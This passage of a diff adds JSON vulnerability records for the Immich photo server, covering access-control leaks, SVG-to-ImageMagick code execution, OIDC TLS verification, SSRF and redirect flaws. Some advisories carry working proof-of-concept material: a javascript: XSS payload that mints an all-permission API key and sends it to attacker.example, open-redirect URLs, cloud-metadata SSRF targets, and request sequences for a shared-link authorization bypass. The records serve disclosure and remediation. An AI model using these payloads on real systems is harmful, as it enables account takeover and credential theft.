+        "CWE-200",
+        "CWE-639",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.1.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-3mh5-gqfm-phgj",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-3mh5-gqfm-phgj",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-3mh5-gqfm-phgj",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:460b50b8b16a597a43221d18414fe2870f6b76b60b3998da7dd30962d8186465",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-119329",
+      "aliases": [
+        "GHSA-hv27-723h-qfjq"
+      ],
+      "title": "Immich: Partner \"view-only\" sharing leaks GPS coordinates of the sharer's archived assets via GET /api/map/markers",
+      "summary": "Immich is a high-performance self-hosted photo and video management solution. Prior to 3.0.0, GET /api/map/markers used server/src/services/map.service.ts to add partner owner identifiers when withPartners=true, while server/src/repositories/map.repository.ts applied Archive visibility to every selected owner when isArchived=true. A view-only partner could therefore enumerate the GPS coordinates and existence of a sharer's archived photos or videos even though the timeline and direct-access paths exclude archived partner assets. The exposure is limited to location metadata and asset identifiers because image bytes remain protected by checkPartnerAccess. This issue is fixed in version 3.0.0.",
+      "published_at": "2026-10-19T12:30:12.000Z",
+      "modified_at": "2026-11-02T16:08:15.406Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00251,
+        "percentile": 0.1657,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-639"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.0.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hv27-723h-qfjq",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/pull/29028",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/commit/b633cc4f046f198bc11648c486e1e6e3f19d26d5",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v3.0.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-119329",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-119329",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-119329",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-119329",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-hv27-723h-qfjq",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hv27-723h-qfjq",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:fec6e89fb9cfeecd687a03e479e6ed4eb769f04d6a19f68cfc8a4af037a66914",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-104867",
+      "aliases": [
+        "GHSA-g82p-27g4-864h"
+      ],
+      "title": "Immich calendar heatmap endpoint discloses cross-user activity through broken access control",
+      "summary": "Immich is a high-performance self-hosted photo and video management solution. From 3.0.0 until 3.2.0, the GET /api/admin/users/{id}/calendar-heatmap route in server/src/controllers/user-admin.controller.ts uses the ordinary Permission.UserRead permission without an admin-route requirement, and UserAdminService.getCalendarHeatmap in server/src/services/user-admin.service.ts does not compare the authenticated user with the requested user identifier or perform a separate access check. Any authenticated non-admin user can therefore request another account's upload or capture-date activity heatmap for an arbitrary date range. AssetRepository.getCalendarHeatmap in server/src/repositories/asset.repository.ts filters by owner, date, and deletion state but not visibility, so the returned daily counts and total count include archived and locked assets. The route exposes counts and activity dates but does not return asset metadata or content, and it does not affect integrity or availability. This issue is fixed in version 3.2.0.",
+      "published_at": "2026-10-13T15:26:42.000Z",
+      "modified_at": "2026-11-05T18:34:02.825Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00311,
+        "percentile": 0.2426,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-284",
+        "CWE-639",
+        "CWE-1220"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "3.0.0",
+              "last_affected": "3.0.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-g82p-27g4-864h",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/pull/30310",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/commit/6c86d39f6d9955fc5e2998ce808e6f794b5ebd5e",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/commit/f68815e35f4677dbc3a8ff58a7402952672dfceb",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v3.2.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-104867",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-104867",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-104867",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-104867",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-g82p-27g4-864h",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-g82p-27g4-864h",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:8af06f807ebfc710e045614ca1a000e512d9b5a9afb06bc2395fcc05c03116f7",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-105764",
+      "aliases": [
+        "GHSA-q89f-h332-8q2h"
+      ],
+      "title": "Immich: Authenticated SVG upload reaches ImageMagick coders and enables RCE",
+      "summary": "Immich is a high-performance self-hosted photo and video management solution. Prior to 3.2.4, an authenticated non-admin user could upload SVG files that thumbnail-generation code in server/src/repositories/media.repository.ts passed to libvips. Files that bypassed libvips' native SVG loader fell through to ImageMagick, where attacker-controlled &lt;image href&gt; values reached unrestricted MSL and VIDEO coder operations. By storing one crafted asset and referencing its path from a second delayed-marker SVG, an attacker could execute code in the immich-server container when thumbnail processing ran. This issue is fixed in version 3.2.4.",
+      "published_at": "2026-09-28T16:58:52.000Z",
+      "modified_at": "2026-10-06T17:59:18.642Z",
+      "severity": {
+        "level": "high",
+        "score": 7.7,
+        "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.0034,
+        "percentile": 0.27876,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-94"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.2.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-q89f-h332-8q2h",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/immich-app/immich/releases/tag/v3.2.4",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-105764",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-105764",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-105764",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-105764",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-q89f-h332-8q2h",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-q89f-h332-8q2h",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:df856c07dfc317b061da8313bdba493a8b1e7e99b0a68c8883df89c2590eff1b",
+      "note": null
+    },
+    {
+      "id": "GHSA-h5w4-vjv4-9r5q",
+      "aliases": [],
+      "title": "Incorrect sanitization of continue URL on the /maintenance endpoint",
+      "summary": "### Summary\r\n\r\nWhen maintenance mode is OFF (default), visiting `/maintenance?continue=<value>` makes the SvelteKit SPA (root layout, `ssr=false`) call `goto(maintenanceReturnUrl(searchParams))` - the raw `continue` value, unvalidated. SvelteKit `goto()` performs `location.href = url.href` for any non-same-origin URL, so an unauthenticated attacker gets: (1) an **open redirect** (`https://`, `//`, `/\\` forms), and (2) **reflected XSS** on the Immich origin via `continue=javascript:...` / `data:...` - one click → full account takeover, incl. admin (cookie is HttpOnly but same-origin `fetch` with credentials works).\r\n\r\n### Details\r\n\r\n- Sink: `web/src/routes/+layout.ts:17-21` - `maintenanceShouldRedirect(false, '/maintenance...')` = `false !== true` → `goto(maintenanceReturnUrl(url.searchParams))`.\r\n- Source: `web/src/lib/utils/maintenance.ts:10-12` - `return searchParams.get('continue') ?? '/'` - raw, no origin/scheme check.\r\n- Navigation: SvelteKit 2.56.1 `client.js` - `goto` → `is_external_url` (origin `'null'` for `javascript:` ≠ app origin) → `native_navigation` → `location.href = url.href` → script executes.\r\n- Server: `workers/api.ts:17` registers `ApiService.ssr` which serves the SPA (200) for `GET /maintenance?...`; no redirect, no special-casing.\r\n- No mitigation: helmet/CSP disabled by default (`config.repository.ts:154-163`, only with `IMMICH_HELMET_CONFIG_FILE`); login-page guard `Route.continue` (`route.ts:153-161`, fixes GHSA-8244-8vpr-vp9c/-qp2h-w794-2vhf) is **not applied** on this path.\r\n\r\n### PoC\r\n\r\n```\r\nhttps://<host>/maintenance?continue=https://evil.example/phish        # open redirect\r\nhttps://<host>/maintenance?continue=/\\evil.example/oauth-callback     # backslash variant\r\nhttps://<host>/maintenance?continue=javascript:alert(document.domain) # XSS\r\n# account takeover (exfil 'all'-permission API key; if admin clicks → full server compromise):\r\nhttps://<host>/maintenance?continue=javascript:fetch('/api/api-keys',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({name:'pwn',permissions:['all']})}).then(r=>r.json()).then(j=>fetch('https://attacker.example/c?k='+j.secret))\r\n```\r\n\r\nVerified against the shipped code at `225ca9ab8` (v3.1.0-165): layout logic, `maintenanceReturnUrl`, SvelteKit 2.56.1 source, `ApiService.ssr`, default helmet config. Works for authenticated and unauthenticated visitors.\r\n\r\n### Impact\r\n\r\nUnauthenticated, one-click. Open redirect (phishing on the trusted domain) + XSS on the Immich origin → photo-library exfiltration, account takeover (password/email change, `permissions:[\"all\"]` API keys); admin victim → backups, users, config - full server compromise.",
+      "published_at": "2026-08-23T17:52:57.000Z",
+      "modified_at": "2026-08-23T17:53:24.000Z",
+      "severity": {
+        "level": "low",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-79",
+        "CWE-116"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "last_affected": "3.1.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-h5w4-vjv4-9r5q",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-h5w4-vjv4-9r5q",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-h5w4-vjv4-9r5q",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:bb9520363b03f2edcef7b76dc3a62345ce0a3da23ffbff4e7ab12a5b42cc205d",
+      "note": null
+    },
+    {
+      "id": "GHSA-hfvf-5c8x-8rc4",
+      "aliases": [],
+      "title": "OIDC discovery/token/userinfo/JWKS fetches run with TLS certificate verification unconditionally disabled via allowInsecureRequests (CWE-295)",
+      "summary": "# OIDC discovery / token / userinfo / JWKS fetches run with TLS certificate verification unconditionally disabled via `allowInsecureRequests` (CWE-295)\r\n\r\n**Venue:** https://github.com/immich-app/immich/security/advisories/new\r\n**Affected:** `immich-app/immich` - all versions through HEAD (2026-04-11) that call `getClient()` in `oauth.repository.ts`\r\n**Affected files:**\r\n- `server/src/repositories/oauth.repository.ts:3,9,128-155` (`getClient()` passes `allowInsecureRequests` to `discovery()` unconditionally)\r\n- `server/src/repositories/oauth.repository.ts:116-126` (`getProfilePicture()` calls `fetch(url)` on the OIDC `picture` claim - related; covered below)\r\n- `server/src/dtos/system-config.dto.ts:439-441` (`issuerUrl` has `@IsString()` only, no `@IsUrl()`)\r\n**CWE:** CWE-295 (Improper Certificate Validation), CWE-346 (Origin Validation Error)\r\n\r\n---\r\n\r\n## Summary\r\n\r\nImmich's OIDC integration builds a single `openid-client` instance for every authentication event by calling `discovery(issuerUrl, clientId, metadata, authMethod, options)`. The `options` argument is a literal object whose `execute` array contains the `openid-client` built-in `allowInsecureRequests` interceptor - unconditionally, with no feature flag, no config toggle, no `NODE_ENV` check, and no warning. According to the `openid-client` documentation, `allowInsecureRequests` disables TLS certificate verification for every HTTP request the resulting client performs: the `.well-known/openid-configuration` discovery fetch, the JWKS fetch, the `/authorize` redirect target resolution, the `/token` POST, and the `/userinfo` GET. A network-adjacent attacker (on the same LAN, the same k8s cluster, or via DNS poisoning / BGP hijack on the path between Immich and the IdP) who can observe or intercept the TCP connection to the IdP can present any TLS certificate and will be accepted without verification.\r\n\r\nThe attacker can then serve a crafted `.well-known/openid-configuration` response that points `token_endpoint` and `userinfo_endpoint` at an attacker-controlled host, a crafted `/token` response that returns a self-signed JWT, and a crafted `/userinfo` response that claims the victim is an arbitrary local Immich user (including the administrator, whose email is typically the admin's well-known address). Immich's `userMapping` logic then matches the OIDC identity against a local user and logs the attacker in with that user's session - full authentication bypass on every Immich deployment that has OIDC enabled.\r\n\r\nBecause the `allowInsecureRequests` flag is applied to the entire `openid-client` HTTP stack, this also affects any fetch the client makes to the JWKS endpoint, which is used to validate the signature of received ID tokens. An attacker who can forge the JWKS response can sign arbitrary JWTs with a key pair they control and submit them as valid ID tokens.\r\n\r\n## Details\r\n\r\n### Unconditional `allowInsecureRequests` in `getClient()`\r\n\r\n`server/src/repositories/oauth.repository.ts:128-155`:\r\n```ts\r\nprivate async getClient({\r\n  issuerUrl,\r\n  clientId,\r\n  clientSecret,\r\n  profileSigningAlgorithm,\r\n  signingAlgorithm,\r\n  tokenEndpointAuthMethod,\r\n  timeout,\r\n}: OAuthConfig) {\r\n  try {\r\n    return await discovery(\r\n      new URL(issuerUrl),\r\n      clientId,\r\n      {\r\n        client_secret: clientSecret,\r\n        response_types: ['code'],\r\n        userinfo_signed_response_alg: profileSigningAlgorithm === 'none' ? undefined : profileSigningAlgorithm,\r\n        id_token_signed_response_alg: signingAlgorithm,\r\n      },\r\n      this.getTokenAuthMethod(tokenEndpointAuthMethod, clientSecret),\r\n      {\r\n        execute: [allowInsecureRequests],   // <-- unconditionally applied\r\n        timeout,\r\n      },\r\n    );\r\n  } catch (error: any | AggregateError) {\r\n    this.logger.error(`Error in OAuth discovery: ${error}`, error?.stack, error?.errors);\r\n    throw new InternalServerErrorException(`Error in OAuth discovery: ${error}`, { cause: error });\r\n  }\r\n}\r\n```\r\n\r\nObservations:\r\n1. Th...",
+      "published_at": "2026-07-06T09:50:45.000Z",
+      "modified_at": "2026-07-06T09:50:45.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.7,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-295"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": []
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hfvf-5c8x-8rc4",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-hfvf-5c8x-8rc4",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hfvf-5c8x-8rc4",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:02c62b2840397eb359a0847475ce528da9b8d8d681f5abf8c03bbc9f30d81202",
+      "note": null
+    },
+    {
+      "id": "GHSA-qp2h-w794-2vhf",
+      "aliases": [],
+      "title": "Incomplete fix for login continue redirect allows slash-backslash open redirect",
+      "summary": "## Summary\r\n\r\nThe fix for GHSA-8244-8vpr-vp9c / PR #28706 added `Route.continue` to keep login continuation URLs same-origin, but the current check still accepts slash-backslash URLs. A `continue` value such as `/\\\\evil.example/oauth-callback` passes the helper because it starts with `/` and does not start with `//`. Browser-compatible URL handling treats the backslash as a path separator for special schemes, so a `Location: /\\\\evil.example/oauth-callback` redirect resolves to `https://evil.example/oauth-callback`.\r\n\r\n## Impact\r\n\r\nAn attacker can craft an Immich login URL whose continuation value bypasses the same-origin redirect check. When the authenticated-login redirect path uses the sanitized value in `redirect(307, continueUrl)`, the browser follows the response to an attacker-controlled origin. This is an incomplete fix for the public login continuation redirect class.\r\n\r\n## Reproduction\r\n\r\n1. Use a current main checkout at commit `e2de8c7c536cac5a673a3aa60cc998815b62d247`.\r\n2. Observe the current helper in `web/src/lib/route.ts`:\r\n\r\n```ts\r\ncontinue: (url: string | null, fallback: string) => {\r\n  if (!url || !url.startsWith('/') || url.startsWith('//')) {\r\n    return fallback;\r\n  }\r\n\r\n  return url;\r\n},\r\n```\r\n\r\n3. Decode the attacker-controlled login URL parameter:\r\n\r\n```js\r\nconst raw = 'https://immich.local/auth/login?continue=%2F%5Cevil.example%2Foauth-callback';\r\nconst parsed = new URL(raw);\r\nconst c = parsed.searchParams.get('continue');\r\n```\r\n\r\n4. Pass the decoded value through the current helper:\r\n\r\n```js\r\nfunction routeContinue(url, fallback) {\r\n  return (!url || !url.startsWith('/') || url.startsWith('//')) ? fallback : url;\r\n}\r\nconst location = routeContinue(c, '/photos');\r\nconsole.log(location);\r\nconsole.log(new URL(location, 'https://immich.local').href);\r\n```\r\n\r\nObserved result:\r\n\r\n```json\r\n{\r\n  \"searchParamContinue\": \"/\\\\evil.example/oauth-callback\",\r\n  \"routeContinueReturn\": \"/\\\\evil.example/oauth-callback\",\r\n  \"browserResolved\": \"https://evil.example/oauth-callback\"\r\n}\r\n```\r\n\r\n5. The login load path uses the returned value as a redirect location for already-authenticated users:\r\n\r\n```ts\r\nconst continueUrl = Route.continue(url.searchParams.get('continue'), Route.photos());\r\n\r\nif (authManager.authenticated) {\r\n  redirect(307, continueUrl);\r\n}\r\n```\r\n\r\n## Browser evidence\r\n\r\nA local Chrome proof served `307 Location: /\\\\127.0.0.1:<port>/pwn?marker=slash-backslash` from `http://localhost:<port>/start`. Chrome followed the redirect as a network request to host `127.0.0.1:<port>`, not `localhost:<port>`, and rendered the destination page. The recorded requests were:\r\n\r\n```json\r\n[\r\n  {\"path\":\"/start\",\"host\":\"localhost:<port>\"},\r\n  {\"path\":\"/pwn?marker=slash-backslash\",\"host\":\"127.0.0.1:<port>\"}\r\n]\r\n```\r\n\r\nThis demonstrates that a browser follows the slash-backslash Location value as an authority-changing redirect.\r\n\r\n## Root cause\r\n\r\n`Route.continue` performs string prefix checks before any URL normalization. It rejects protocol-relative values beginning with `//`, but it does not reject backslashes. Browsers normalize backslashes as slashes for special schemes during URL processing, so `/\\evil.example/path` is effectively treated like `//evil.example/path` by the browser even though it bypasses the helper's `startsWith('//')` check.\r\n\r\n## Remediation\r\n\r\nReject backslashes before returning a continuation URL, or parse the value against the deployment origin and require the parsed origin to match the Immich origin before using the value in a redirect or navigation sink.\r\n\r\nFor example:\r\n\r\n```ts\r\ncontinue: (url: string | null, fallback: string) => {\r\n  if (!url || url.includes('\\\\') || !url.startsWith('/') || url.startsWith('//')) {\r\n    return fallback;\r\n  }\r\n\r\n  return url;\r\n}\r\n```\r\n\r\nA stronger fix is to normalize with `new URL(url, origin)` and return only values whose parsed origin equals the expected Immich origin.",
+      "published_at": "2026-07-06T09:50:45.000Z",
+      "modified_at": "2026-07-06T09:50:45.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-601"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": []
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-qp2h-w794-2vhf",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-qp2h-w794-2vhf",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-qp2h-w794-2vhf",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:02c62b2840397eb359a0847475ce528da9b8d8d681f5abf8c03bbc9f30d81202",
+      "note": null
+    },
+    {
+      "id": "GHSA-hq46-gw2v-q86p",
+      "aliases": [],
+      "title": "SSRF via OAuth Profile Picture URL (CWE-918)",
+      "summary": "## Summary\r\n\r\nThe OAuth profile picture synchronization feature in Immich is vulnerable to Server-Side Request Forgery (SSRF). When a user authenticates via OIDC/OAuth, the `profile.picture` URL from the identity provider's userinfo response is fetched server-side without any URL validation or IP filtering.\r\n\r\n## Vulnerable Code\r\n\r\n**`server/src/repositories/oauth.repository.ts` line 96-106:**\r\n```typescript\r\nasync getProfilePicture(url: string) {\r\n  const response = await fetch(url);  // No validation\r\n  if (!response.ok) {\r\n    throw new Error(`Failed to fetch picture: ${response.statusText}`);\r\n  }\r\n  return {\r\n    data: await response.arrayBuffer(),\r\n    contentType: response.headers.get('content-type'),\r\n  };\r\n}\r\n```\r\n\r\n**Called from `server/src/services/auth.service.ts` line 334-335:**\r\n```typescript\r\nif (!user.profileImagePath && profile.picture) {\r\n  await this.syncProfilePicture(user, profile.picture);\r\n}\r\n```\r\n\r\nThe `profile.picture` value comes from the OIDC provider's UserInfoResponse. Many identity providers (Keycloak, Authentik, Authelia, etc.) allow users to set arbitrary profile picture URLs.\r\n\r\n## Attack Scenario\r\n\r\n1. Attacker registers on the configured OIDC provider and sets their profile picture URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS metadata) or `http://10.0.0.1:8080/admin` (internal service)\r\n2. Attacker authenticates to Immich via OAuth\r\n3. Immich server fetches the attacker-controlled URL at `oauth.repository.ts:97`\r\n4. Response data (including cloud credentials or internal service responses) is written to disk as a profile image file\r\n\r\n## Impact\r\n\r\n- **Cloud metadata theft**: Access AWS/GCP/Azure instance metadata endpoints to steal IAM credentials, service account tokens\r\n- **Internal network scanning**: Probe internal services on private IP ranges (10.x, 172.16.x, 192.168.x)\r\n- **Information disclosure**: Read responses from internal APIs, databases, admin panels\r\n- **No authentication bypass needed**: The attacker authenticates normally via the configured OIDC provider\r\n\r\n## Missing Protections\r\n\r\n- No URL scheme validation (allows `file://`, `gopher://`)\r\n- No IP address filtering against private/reserved ranges\r\n- No DNS rebinding protection\r\n- No redirect following limits\r\n- No request timeout\r\n- No `request-filtering-agent` or equivalent SSRF guard anywhere in the codebase\r\n\r\n## Remediation\r\n\r\nValidate the URL before fetching:\r\n1. Restrict to `https://` scheme only\r\n2. Resolve the hostname and check the IP against private/reserved ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, fd00::/8)\r\n3. Use a library like `ssrf-req-filter` or `request-filtering-agent` to enforce these checks\r\n4. Add a timeout to the fetch request\r\n5. Optionally allowlist image content types in the response",
+      "published_at": "2026-07-06T09:50:44.000Z",
+      "modified_at": "2026-07-06T09:50:44.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-918"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.0.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hq46-gw2v-q86p",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-hq46-gw2v-q86p",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-hq46-gw2v-q86p",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:fec6e89fb9cfeecd687a03e479e6ed4eb769f04d6a19f68cfc8a4af037a66914",
+      "note": null
+    },
+    {
+      "id": "GHSA-hvq7-hq9r-8gjr",
+      "aliases": [],
+      "title": "[DCODX-AI] Shared-link authentication allows adding owner's assets to shared links (AssetShare authorization bypass)",
+      "summary": "This vulnerability has been found and chained by DCODX-AI. Validation of the exploit chain has been confirmed manually.\r\n\r\n\r\n### Summary\r\nAn authorization bypass in the shared-link access logic allows an attacker possessing only a shared link key or slug to add arbitrary assets owned by the link owner into that shared link without authenticating as the owner. This grants owner-level AssetShare modifications to anyone with the share key, enabling unauthorized modification of public shares, content manipulation, and privacy breaches.\r\n\r\n---\r\n\r\n### Details\r\n**Root cause:**  \r\nIn `checkSharedLinkAccess` the `Permission.AssetShare` branch uses the shared link's `userId` to perform owner-level checks: it calls `access.asset.checkOwnerAccess(sharedLink.userId, ids, false)`. This treats requests authenticated via a shared-link key as if they were made by the link owner, granting AssetShare access to anyone possessing only the share key/slug.\r\n\r\n**Incriminated source (snippet):**\r\n```ts\r\n// server/src/utils/access.ts\r\ncase Permission.AssetShare: {\r\n  // TODO: fix this to not use sharedLink.userId for access control\r\n  return await access.asset.checkOwnerAccess(sharedLink.userId, ids, false);\r\n}\r\n```\r\n\r\nThis pattern effectively elevates privileges for shared-link authenticated sessions by reusing owner-based access checks. The expected behavior is that shared-link authentication should be scoped to the assets explicitly present in the shared link (or limited further), and not treated as a full owner session.\r\n\r\n---\r\n\r\n### PoC\r\n**Prerequisites:** ability to perform HTTP requests to the target instance (local or test environment). The following PoC uses local hostnames used in the environment where this bug was discovered.\r\n\r\n1. **Login as owner**  \r\n   ```\r\n   POST http://immich.local.app:2283/api/auth/login\r\n   Content-Type: application/json\r\n\r\n   Body:\r\n   {\r\n     \"email\":\"owner@dcodx.com\",\r\n     \"password\":\"xxxxx\"\r\n   }\r\n   ```\r\n   *Expected:* HTTP 200/201 and access token / cookies.\r\n\r\n2. **Enumerate assets (owner session)**  \r\n   ```\r\n   GET http://immich.local.app:2283/api/assets/random?count=2\r\n   Authorization: Bearer <owner_access_token>\r\n   ```\r\n   *Action:* Extract `asset1` and `asset2` IDs from response.\r\n\r\n3. **Create an individual shared link as owner**  \r\n   ```\r\n   POST http://immich.local.app:2283/api/shared-links\r\n   Content-Type: application/json\r\n   Authorization: Bearer <owner_access_token>\r\n\r\n   Body:\r\n   {\r\n     \"type\":\"INDIVIDUAL\",\r\n     \"assetIds\":[\"<asset1>\"]\r\n   }\r\n   ```\r\n   *Expected:* Response contains `sharedLinkId` and `sharedLinkKey`.\r\n\r\n4. **Without owner credentials (new session), add another owner asset to the shared link using only the shared link key**  \r\n   ```\r\n   PUT http://immich.local.app:2283/api/shared-links/{sharedLinkId}/assets?key={sharedLinkKey}\r\n   Content-Type: application/json\r\n\r\n   Body:\r\n   {\r\n     \"assetIds\":[\"<asset2>\"]\r\n   }\r\n   ```\r\n\r\n5. **Observe result**  \r\n   *Expected:* HTTP 200 and response JSON:\r\n   ```json\r\n   {\r\n     \"assetId\":\"<asset2>\",\r\n     \"success\": true\r\n   }\r\n   ```\r\n   This confirms possession of only the shared link key allowed adding the owner's asset to the shared link (authorization bypass).\r\n\r\n**Dependencies:** requests (or any HTTP client)\r\n\r\n---\r\n\r\n### Impact\r\n**Type:** Authorization bypass (AuthZ) - .  \r\n**Who is impacted:** Owners of shared links and users whose assets are included in those links; site privacy and content integrity are at risk. Attackers in possession of shared link keys (with different Download, Upload and Metadata access) can manipulate shared-link contents (add owner's assets), potentially exposing private assets or altering public share content.\r\n\r\n---\r\n\r\n### Remediation\r\n1. **Do NOT treat shared-link authentication as equivalent to owner session for AssetShare.**  \r\n   In `server/src/utils/access.ts` change the `Permission.AssetShare` branch to **NOT** call `checkOwnerAccess(sharedLink.userId, ...)`. For anonymous/shared-link auth...",
+      "published_at": "2026-07-06T09:50:44.000Z",
+      "modified_at": "2026-07-06T09:50:45.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.9,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-284"
+      ],
